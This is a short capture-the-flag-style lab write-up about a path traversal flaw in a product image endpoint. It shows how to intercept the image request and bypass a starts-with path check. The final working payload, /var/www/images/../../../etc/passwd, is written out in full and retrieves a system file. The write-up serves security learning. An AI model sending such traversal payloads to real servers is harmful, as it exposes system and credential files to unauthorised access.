* Lab Contains
- path traversal vulnerability in display of product images
- transmits full file path via request parameter
- validates the supplied path start with the expected folder

* End Goal
- retrieve contents of the ~/etc/passwd~
* Solution
- Access the lab
- Open a product image on new tab of browser and intercept the request with proxy (burpsuite)
- Send the request to repeater & observe
- ~GET /image?filename=/var/www/images/31.jpg HTTP/2~
- So in here we can see that filename parameter is using full path of the file
  - Now we can try with full path to retrieve our ~passwd~ file contents
  - Payload ~filename=/etc/passwd~
** Send Payload
- send this ~/etc/passwd~ payload and look at the response
  - Server give ~400: bad request~ It says /"Missing parameter 'filename'"/
*** Fix the error
we can move upto directory of /etc and access ~passwd~ file
- ~GET /image?filename=/var/www/images//../../../etc/passwd HTTP/2~
- Success 200:OK
* Payload to solve the lab
~/var/www/images/../../../etc/passwd~
